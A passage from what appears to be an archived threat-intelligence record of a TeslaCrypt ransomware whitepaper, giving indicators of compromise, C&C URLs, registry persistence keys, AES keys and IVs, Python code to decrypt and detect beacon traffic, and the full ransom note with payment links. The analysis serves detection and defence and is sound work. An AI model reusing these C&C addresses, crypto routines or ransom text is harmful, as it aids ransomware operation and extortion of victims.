http://worldisonefamily.info/zz/libraries/bstr.php\n     http://biocarbon.com.ec/wp-content/uploads/bstr.php\n\n```\n  - Presence of the following mutex in the system:\n```\n     8765-123rvr4\n\n```\n\n-----\n\n- Importing a specific plaintext decryption key (see Appendix B):\n```\n   kasdfgh283\n\n```\n- HTTP specific packets during the network communication (see **Appendix C).**\n\n- Presence of the following registry keys:\n\n### Registry Key  Subkey  Value \n```\n                     String of\n   HKEY_CURRENT_USER\\Software\\Micr length 0x0C \"C:\\WINDOWS\\system32\\\n   osoft\\Windows\\CurrentVersion\\Ru that consists cmd.exe /c start \"\"\n   n  only of lower \"${PATH_TO_EXE}\"\" \n                     letters \n   HKEY_USERS\\S-1-5- REG:BINARY of size 8\n                     ID \n   18\\Software\\zzzsys  bytes \n   HKEY_CURRENT_USER\\Software\\zzzs REG:BINARY of size 8\n                     ID \n   ys  bytes \n   HKEY_USERS\\S-1-5- REG:BINARY of size\n   18\\Software\\zzzsys\\hexlified_ID [data ] 0x100 bytes \n   HKEY_CURRENT_USER\\Software\\zzzs REG:BINARY of size\n                     data \n   ys\\hexlified_ID  0x100 bytes \n\n```\n- Presence of the following files in the system:\n```\n    CSIDL_MYDOCUMENTS\\recover_file_${random_0x09_lower}.txt\n    ${DESKTOP}\\RECOVERY.TXT \n    ${DESKTOP}\\RECOVERY.HTM \n    ${DESKTOP}\\RECOVERY.png \n    *\\_RECoVERY_+${random_0x05_lower}.txt \n    *\\_RECoVERY_+${random_0x05_lower}.html \n    *\\_RECoVERY_+${random_0x05_lower}.png \n\n```\n|Registry Key|Subkey|Value|\n|---|---|---|\n|HKEY_CURRENT_USER\\Software\\Micr osoft\\Windows\\CurrentVersion\\Ru n|String of length 0x0C that consists only of lower letters|\"C:\\WINDOWS\\system32\\ cmd.exe /c start \"\" \"${PATH_TO_EXE}\"\"|\n|HKEY_USERS\\S-1-5- 18\\Software\\zzzsys|ID|REG:BINARY of size 8 bytes|\n|HKEY_CURRENT_USER\\Software\\zzzs ys|ID|REG:BINARY of size 8 bytes|\n|HKEY_USERS\\S-1-5- 18\\Software\\zzzsys\\hexlified_ID|data|REG:BINARY of size 0x100 bytes|\n|HKEY_CURRENT_USER\\Software\\zzzs ys\\hexlified_ID|data|REG:BINARY of size 0x100 bytes|\n\n\n-----\n\n### APPENDIX A: AES ENCRYPTION ROUTINE\n```\nfrom Crypto.Cipher import AES\ndef aes_encrypt(sc, iv, pt, fp=True):\n bs = AES.block_size\n cipher = AES.new(sc, AES.MODE_CBC, iv)\n  if len(pt) % bs:\n  pad_len = bs - (len(pt) % bs)\n  pt += chr(pad_len) * pad_len\n  elif fp:\n  pt += chr(bs) * bs\n  return cipher.encrypt(pt)\n\n APPENDIX B: DISK ENCRYPTION PREVENTION BY IMPORTED CRYPTOGRAPHIC KEY\n\n```\nTeslaCrypt uses the following key to decrypt internal data:\n```\nkasdfgh283\n\n```\nThis key is imported with the WinAPI function:\n```\nBOOL WINAPI CryptImportKey(\n _In_ HCRYPTPROV hProv,\n _In_ BYTE    *pbData,\n _In_ DWORD   dwDataLen,\n _In_ HCRYPTKEY hPubKey,\n _In_ DWORD   dwFlags,\n _Out_ HCRYPTKEY *phKey\n);\n\n```\nThe ransomware uses the following parameters (important ones are colored in red):\n```\nCryptImportKey(\n AnyCryptoProv,\n  PublicKey,\n  0x4c,\n  0,\n  0,\n AnyAddr\n);\n\n```\n\n-----\n\n```\nPublicKey represents the following PublicKeyBlob structure:\ntypedef struct {\n  BLOBHEADER blob_hdr;\n  ULONG cbPublicKey;\n  BYTE PublicKey[1]\n} PublicKeyBlob;\ntypedef struct _PUBLICKEYSTRUC {\n BYTE  bType;\n BYTE  bVersion;\n WORD  reserved;\n ALG_ID aiKeyAlg;\n} BLOBHEADER, PUBLICKEYSTRUC;\n\n```\nWhen importing the following configuration of PublicKey:\n\nAs the same parameters are passed to the CryptImportKey, the following steps can be performed to detect\nTeslaCrypt processes:\n\n1. Intercept the CryptImportKey call and check if dwDataLen, hPubKey, dwFlags contain the values\n\nspecified above. If so, go to the next step. Otherwise, continue function normal execution.\n\n2. Check if the pbData structure contains the data presented above. If the data is the same, we can\n\nassume that the calling process is TeslaCrypt and break its execution.\n\n### APPENDIX C: DISK ENCRYPTION PREVENTION BY NETWORK COMMUNICATION SIGNATURES\n\nWhen communicating with the C&C servers, the ransomware encrypts the sent data using an AES-CBC-128\nalgorithm. The following AES-related data is used:\n```\nIV = '\\xFF\\xFF\\xAA\\xAA\\x00\\x00\\xBE\\xEF\\xDE\\xAD\\x00\\x00\\xBE\\xFF\\xFF\\xFF'\nkey = SHA256('0324532423723948572379453249857')\n\n```\nThe encrypted data is hexlified and used as a value for the data key:\n```\nhttp_body = 'data=%s' % hexlify(data_encrypted)\n\n```\n\n-----\n\nTo detect the presence of the TeslaCrypt ransomware, perform the following operations with the HTTP\npacket:\n\n1. Check if User-Agent equals:\n```\n     UserAgent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch;\n     rv:11.0) like Gecko\n\n```\nIf so, go to the next step.\n\n2. The code that is responsible for checking if the HTTP packet is likely sent by TeslaCrypt is presented\n\nbelow:\n```\n     from binascii import unhexlify\n     from Crypto.Cipher import AES\n     from hashlib import sha256\n     from re import compile\n     def aes_decrypt(sc, iv, ct):\n      cipher = AES.new(sc, AES.MODE_CBC, iv)\n      return cipher.decrypt(ct)\n     def inet_http_body_decrypt(http_body):\n      IV =\n     '\\xFF\\xFF\\xAA\\xAA\\x00\\x00\\xBE\\xEF\\xDE\\xAD\\x00\\x00\\xBE\\xFF\\xFF\\xFF'\n      key = sha256('0324532423723948572379453249857').digest()\n      http_body_data = None\n      http_body_delim = 'data='\n      if not http_body.startswith(http_body_delim):\n       return None\n      http_body_data = http_body[len(http_body_delim):]\n      try:\n       http_body_data = unhexlify(http_body_data)\n      except Exception:\n       return None\n      try:\n       http_body_dec = aes_decrypt(key, IV, http_body_data)\n      except Exception:\n       return None\n      pb = ord(http_body_dec[-1])\n      http_body_dec = http_body_dec[:-pb]\n\n```\n\n-----\n\n```\n   if ord(http_body_dec[-1]):\n    return None\n   return http_body_dec[:-1]\n  def inet_http_is_tesla(http):\n   tc_ua = 'UserAgent: Mozilla/5.0 (Windows NT 6.3; WOW64;\n  Trident/7.0; Touch; rv:11.0) like Gecko'\n   # Just for PoC\n   tc_body =\n  compile('^Sub=.*&dh=.*&addr=.*&size=.*&version=.*&OS=.*&ID=.*&inst_\n  id=.*$')\n   if http['User-Agent'] != tc_ua:\n    return False\n   http_body_dec = inet_http_body_decrypt(http['body'])\n   if not http_body_dec:\n    return False\n   print '[+] Decrypted HTTP BODY: %s' % http_body_dec\n   return tc_body.match(http_body_dec) is not None\n\n```\nIf such a HTTP packet was caught, we can assume that it was sent by a TeslaCrypt process. Find\nthis process and break its execution.\n\n\n-----\n\n### APPENDIX D: RANSOM MESSAGE IMAGE\n\n\n-----\n\n### APPENDIX E: RANSOM MESSAGE WEB PAGE\n\n\n-----\n\n### APPENDIX F: RANSOM MESSAGE TEXT\n```\nNOT YOUR LANGUAGE? USE https://translate.google.com \nWhat happened to your files ?\nAll of your files were protected by a strong encryption with RSA4096 \nMore information about the encryption keys using RSA4096 can be found here:\nhttp://en.wikipedia.org/wiki/RSA_(cryptosystem)\nHow did this happen ?\n!!! Specially for your PC was generated personal RSA4096 KEY, both public and\nprivate.\n!!! ALL YOUR FILES were encrypted with the public key, which has been transferred\nto your computer via the Internet.\n!!! Decrypting of your files is only possible with the help of the private key and\ndecrypt program, which is on our Secret Server \nWhat do I do ?\nSo, there are two ways you can choose: wait for a miracle and get your price\ndoubled, or start obtaining BITCOIN NOW!, and restore your data easy way.\nIf You have really valuable data, you better not waste your time, because there is\nno other way to get your files, except make a payment.\nFor more specific instructions, please visit your personal home page, there are a\nfew different addresses pointing to your page below:\n1. http://pts764gt354fder34fsqw45gdfsavadfgsfg.kraskula.com/E406831E97DB790\n2. http://sondr5344ygfweyjbfkw4fhsefv.heliofetch.at/E406831E97DB790\n3. http://uiredn4njfsa4234bafb32ygjdawfvs.frascuft.com/E406831E97DB790\nIf for some reasons the addresses are not available, follow these steps:\n1. Download and install tor-browser:\nhttp://www.torproject.org/projects/torbrowser.html.en \n2. After a successful installation, run the browser \n3. Type in the address bar: xlowfznrg4wf7dli.onion/E406831E97DB790 \n4. Follow the instructions on the site.\n---------------- IMPORTANT INFORMATION-----------------------*-*-* Your personal pages:\nhttp://pts764gt354fder34fsqw45gdfsavadfgsfg.kraskula.com/E406831E97DB790\nhttp://sondr5344ygfweyjbfkw4fhsefv.heliofetch.at/E406831E97DB790\nhttp://uiredn4njfsa4234bafb32ygjdawfvs.frascuft.com/E406831E97DB790 \n*-*-* Your personal page Tor-Browser: xlowfznrg4wf7dli.ONION/E406831E97DB790\n\n```\n\n-----\n\n### APPENDIX G: FILE EXTENSIONS TO ENCRYPT\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://blog.checkpoint.com/wp-content/uploads/2016/05/Tesla-crypt-whitepaper_V3.pdf"
    ],
    "report_names": [
        "Tesla-crypt-whitepaper_V3.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cf7fc640-acfe-41c4-9f3d-5515d53a3ffb",
            "created_at": "2023-01-06T13:46:38.228042Z",
            "updated_at": "2025-03-27T02:00:02.775905Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "GIF89a",
                "G0006",
                "PLA Unit 61398",
                "Group 3",
                "TG-8223",
                "Comment Group",
                "ShadyRAT",
                "COMMENT PANDA",
                "Comment Crew",
                "Byzantine Candor",
                "Brown Fox"
            ],
            "source_name": "MISPGALAXY:APT1",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3aaf0755-5c9b-4612-9f0e-e266ef1bdb4b",
            "created_at": "2022-10-25T16:07:23.480196Z",
            "updated_at": "2025-03-27T02:02:09.826059Z",
            "deleted_at": null,
            "main_name": "Comment Crew",
            "aliases": [
                "APT 1",
                "BrownFox",
                "Byzantine Candor",
                "Byzantine Hades",
                "Comment Crew",
                "Comment Panda",
                "GIF89a",
                "Group 3",
                "Operation Oceansalt",
                "Operation Seasalt",
                "Operation Siesta",
                "Shanghai Group",
                "TG-8223"
            ],
            "source_name": "ETDA:Comment Crew",
            "tools": [
                "Auriga",
                "Cachedump",
                "Chymine",
                "CookieBag",
                "Darkmoon",
                "GDOCUPLOAD",
                "GLOOXMAIL",
                "GREENCAT",
                "Gen:Trojan.Heur.PT",
                "GetMail",
                "Hackfase",
                "Hacksfase",
                "Helauto",
                "Kurton",
                "LETSGO",
                "LIGHTBOLT",
                "LIGHTDART",
                "LOLBAS",
                "LOLBins",
                "LONGRUN",
                "Living off the Land",
                "Lslsass",
                "MAPIget",
                "ManItsMe",
                "Mimikatz",
                "MiniASP",
                "Oceansalt",
                "Pass-The-Hash Toolkit",
                "Poison Ivy",
                "ProcDump",
                "Riodrv",
                "SPIVY",
                "Seasalt",
                "ShadyRAT",
                "StarsyPound",
                "TROJAN.COOKIES",
                "TROJAN.FOXY",
                "TabMsgSQL",
                "Tarsip",
                "Trojan.GTALK",
                "WebC2",
                "WebC2-AdSpace",
                "WebC2-Ausov",
                "WebC2-Bolid",
                "WebC2-Cson",
                "WebC2-DIV",
                "WebC2-GreenCat",
                "WebC2-Head",
                "WebC2-Kt3",
                "WebC2-Qbp",
                "WebC2-Rave",
                "WebC2-Table",
                "WebC2-UGX",
                "WebC2-Yahoo",
                "Wordpress Bruteforcer",
                "bangat",
                "gsecdump",
                "pivy",
                "poisonivy",
                "pwdump",
                "zxdosml"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041813,
    "ts_creation_date": 1463046791,
    "ts_modification_date": 1463047108,
    "files": {
        "pdf": "https://archive.orkl.eu/4d5c139dec02bcbb7374ca682c7406b607c4ba4f.pdf",
        "text": "https://archive.orkl.eu/4d5c139dec02bcbb7374ca682c7406b607c4ba4f.txt",
        "img": "https://archive.orkl.eu/4d5c139dec02bcbb7374ca682c7406b607c4ba4f.jpg"
    }
}